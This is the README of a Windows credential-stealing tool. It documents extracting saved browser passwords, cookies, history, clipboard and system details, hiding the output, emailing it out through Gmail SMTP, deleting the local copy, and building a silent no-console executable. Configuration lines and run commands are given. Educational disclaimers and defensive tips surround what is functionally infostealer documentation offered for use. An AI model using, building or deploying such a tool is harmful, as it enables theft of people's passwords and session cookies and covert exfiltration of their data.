# 🔐 Browser Credential Extraction Tool

**Version:** 2.0 (Enhanced)  
**Platform:** Windows 10/11  
**Python:** 3.7+

---

## 🚨 LEGAL WARNING

> **This tool is strictly for educational, research, and authorized security testing purposes ONLY.**
> 
> ⛔ **UNAUTHORIZED USE IS ILLEGAL** ⛔
> 
> By using this software, you agree to:
> - Only run it on systems you own or have **explicit written permission** to audit
> - Comply with all applicable laws and regulations
> - Accept full responsibility for any consequences of use
> 
> The authors disclaim all liability for misuse, damage, or illegal activities.

---

## 🎯 What Is This Tool?

This Python-based security research tool demonstrates how browser-stored credentials, cookies, browsing history, and system information can be programmatically extracted from a Windows machine. It's designed for:

- **Security Researchers** - Understanding browser data storage vulnerabilities
- **Penetration Testers** - Authorized security assessments
- **Educators** - Teaching endpoint security and credential hygiene
- **Blue Teams** - Learning attack vectors for better defense

---

## ✨ Features

### Core Features (Original)
- 🔑 **Password Extraction** - Chrome, Edge, Opera, Opera GX, Brave
- 🔓 **Automatic Decryption** - Uses system APIs to decrypt passwords
- 🖥️ **System Fingerprinting** - OS, network, hardware information
- 📋 **Clipboard Capture** - Current clipboard contents
- 🤫 **Stealth Operation** - Hidden folder storage
- ✉️ **Email Exfiltration** - Secure Gmail SMTP delivery

### New Features (v2.0)
- 🦊 **Firefox Support** - Extracts Firefox credentials
- 🍪 **Cookie Extraction** - Captures browser cookies
- 📜 **History Extraction** - Retrieves browsing history
- 📊 **Logging System** - Comprehensive debug logging
- 🧪 **Test Mode** - Local testing without email
- ⚙️ **Config File Support** - JSON configuration
- 📈 **Enhanced Reports** - Detailed formatted output
- 🎯 **Selective Extraction** - Choose what to extract

---

## 🚀 Installation & Setup

### 1. Prerequisites

- Windows 10/11
- Python 3.7 or higher
- Gmail account with App Password

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

**Required packages:**
- `pyperclip` - Clipboard access
- `pycryptodome` - Encryption/decryption
- `requests` - HTTP requests
- `pywin32` - Windows API access

### 3. Configuration

#### Option A: Direct Configuration (Original Method)

Edit the top of `info.py` or `info_enhanced.py`:

```python
SENDER_EMAIL = "your-gmail@gmail.com"
APP_PASSWORD = "abcd efgh ijkl mnop"  # Gmail App Password
RECIPIENT_EMAIL = "recipient@gmail.com"
```

#### Option B: Config File (Enhanced Method)

1. Copy `config.example.json` to `config.json`
2. Edit `config.json` with your settings

**Get Gmail App Password:**
1. Enable 2-Step Verification on your Google Account
2. Go to: https://myaccount.google.com/apppasswords
3. Generate an app password for "Mail"
4. Use the 16-character code (with spaces removed)

---

## 📖 Usage

### Basic Usage (Original Version)

```bash
python info.py
```

This will:
1. Extract browser passwords
2. Gather system info
3. Read clipboard
4. Save to hidden folder
5. Email the report
6. Delete local copy

### Enhanced Usage (New Version)

#### Test Mode (Recommended for First Run)

```bash
python info_enhanced.py --test
```

or

```bash
python info_enhanced.py -t
```

**Test mode:**
- ✅ Runs all extraction
- ✅ Saves report locally (`extraction_report.txt`)
- ✅ Shows statistics
- ❌ Does NOT send email
- ❌ Does NOT delete report

#### Production Mode

```bash
python info_enhanced.py
```

**Production mode:**
- Extracts all data
- Emails report
- Deletes local copy

### Advanced Options

You can modify the `main()` function call to customize:

```python
main(
    test_mode=False,        # Set True for testing
    extract_cookies=True,   # Extract cookies
    extract_history=True    # Extract history
)
```

---

## 📁 Supported Browsers

| Browser | Passwords | Cookies | History | Notes |
|---------|-----------|---------|---------|-------|
| Chrome | ✅ | ✅ | ✅ | Full support |
| Edge | ✅ | ✅ | ✅ | Full support |
| Brave | ✅ | ✅ | ✅ | Full support |
| Opera | ✅ | ✅ | ✅ | Full support |
| Opera GX | ✅ | ✅ | ✅ | Full support |
| Firefox | ⚠️ | ✅ | ✅ | Passwords encrypted with NSS3 |

**Note:** Firefox passwords require additional NSS3 library decryption (not implemented in current version).

---

## 📊 Output Report

The report includes:

```
==========================================
BROWSER EXTRACTION REPORT
==========================================

CREDENTIALS
- Browser name
- Profile
- URL
- Username
- Password

COOKIES (Sample)
- Host
- Cookie name
- Cookie value

BROWSING HISTORY
- Most visited URLs
- Page titles
- Visit counts

SYSTEM INFORMATION
- OS details
- Network info
- Hardware specs
- Public IP

CLIPBOARD CONTENT
- Current clipboard data
==========================================
```

---

## 🛠️ Building an Executable

Create a standalone `.exe` file:

### Install PyInstaller

```bash
pip install pyinstaller
```

### Build (Console Version)

```bash
pyinstaller --onefile info_enhanced.py
```

### Build (No Console - Silent)

```bash
pyinstaller --onefile --windowed info_enhanced.py
```

The executable will be in the `dist/` folder.

---

## 🧪 Testing & Verification

### Step 1: Test Mode

```bash
python info_enhanced.py --test
```

Check the output file `extraction_report.txt` to verify:
- Credentials are extracted
- Cookies are captured
- History is retrieved
- System info is accurate

### Step 2: Email Test

After configuring credentials, run without test mode:

```bash
python info_enhanced.py
```

Check your recipient email for the report.

### Step 3: Review Logs

Check `browser_extraction.log` for detailed operation logs.

---

## 📚 Educational Use Cases

### For Security Training

1. **Demonstrate Attack Vectors**
   - Show how unlocked sessions are vulnerable
   - Illustrate data exposure risks

2. **Teach Defense Strategies**
   - Importance of password managers
   - Not storing passwords in browsers
   - Endpoint protection (EDR, antivirus)
   - User session locking

3. **Blue Team Training**
   - Recognize indicators of credential theft
   - Implement detection mechanisms
   - Respond to data exfiltration

### For Penetration Testing

- Part of authorized security assessments
- Demonstrate post-exploitation capabilities
- Test endpoint security controls
- Validate security awareness training

---

## 🔒 Security & Privacy

### What This Tool Does NOT Do

- ❌ Bypass UAC or require admin rights
- ❌ Install keyloggers or persistent malware
- ❌ Exploit vulnerabilities or zero-days
- ❌ Work remotely without physical/RDP access

### What This Tool DOES

- ✅ Accesses data the current user can already access
- ✅ Uses legitimate Windows APIs for decryption
- ✅ Requires the user session to be unlocked
- ✅ Operates within user permissions

### Detection & Prevention

**This tool can be detected by:**
- Antivirus/EDR solutions
- File integrity monitoring
- Process monitoring
- Network traffic analysis (email sending)

**Prevent credential theft:**
- Use password managers (not browser storage)
- Enable full disk encryption
- Lock sessions when away
- Use multi-factor authentication
- Install EDR/antivirus
- Regular security training

---

## ⚠️ Responsible Use Guidelines

### DO ✅
- Use on your own devices for learning
- Test with explicit written authorization
- Inform users before demonstrations
- Delete all extracted data after use
- Follow responsible disclosure practices
- Comply with all laws and regulations

### DON'T ❌
- Run on others' devices without permission
- Exfiltrate data over untrusted channels
- Store sensitive data insecurely
- Distribute extracted credentials
- Use for malicious purposes
- Violate privacy laws or regulations

---

## 🐛 Troubleshooting

### "Could not decrypt password"
- Browser may use unsupported encryption (v20)
- Try closing the browser and running again

### "Login Data not found"
- Browser not installed or never used
- Check browser paths in code

### Email sending fails
- Verify Gmail App Password is correct
- Check internet connection
- Ensure 2-Step Verification is enabled

### Import errors
- Run: `pip install -r requirements.txt`
- Ensure Python 3.7+ is installed

### Firefox passwords show as encrypted
- Firefox uses NSS3 encryption
- Additional libraries needed for decryption
- Cookies and history still work

---

## 📝 Version History

### v2.0 (Enhanced) - Current
- ✨ Added Firefox support
- ✨ Cookie extraction
- ✨ History extraction
- ✨ Test mode
- ✨ Logging system
- ✨ Config file support
- ✨ Enhanced error handling

### v1.0 (Original)
- Basic password extraction
- System info gathering
- Email exfiltration
- Chromium-based browsers

---

## 📄 License

This software is provided "AS IS" for educational and research purposes only.

**NO WARRANTY** - Use at your own risk.

**NO LIABILITY** - Authors are not responsible for any misuse, damage, or legal consequences.

---

## 🤝 Contributing

Contributions for educational improvements are welcome:
- Bug fixes
- Additional browser support
- Better decryption methods
- Enhanced documentation

**Please ensure all contributions maintain the educational focus and include appropriate warnings.**

---

## 📧 Contact & Support

For educational inquiries or responsible disclosure:
- Open an issue on GitHub
- Follow responsible disclosure guidelines

---

## 🎓 Learn More

**Recommended Resources:**
- OWASP Browser Security Guide
- Windows DPAPI Documentation
- Chromium Security Architecture
- Firefox NSS Library Documentation

**Related Topics:**
- Endpoint Security
- Credential Management
- Data Protection API (DPAPI)
- Browser Security Models
- Post-Exploitation Techniques

---

### 🔥 Remember: With great power comes great responsibility!

**Use this tool ethically. Educate, don't exploit.**

---

*Last Updated: 2024*
